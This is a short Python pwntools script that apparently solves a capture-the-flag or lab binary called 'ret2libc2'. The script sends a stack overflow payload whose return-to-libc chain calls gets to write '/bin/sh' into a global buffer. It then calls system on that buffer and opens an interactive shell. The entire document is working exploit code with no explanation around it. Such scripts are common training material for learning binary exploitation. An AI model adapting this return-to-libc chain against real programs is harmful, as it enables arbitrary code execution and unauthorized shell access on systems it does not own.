from pwn import *
io = process('./ret2libc2')
system = 0x8048490
get = 0x8048460 
pop_ret = 0x0804843d
buf2 = 0x804A080
over = b'a'*(108+4)
payload =flat([over,p32(get),p32(pop_ret),p32(buf2),p32(system),b'dead',p32(buf2)])
io.sendline(payload)
io.sendline(b'/bin/sh')
io.interactive()

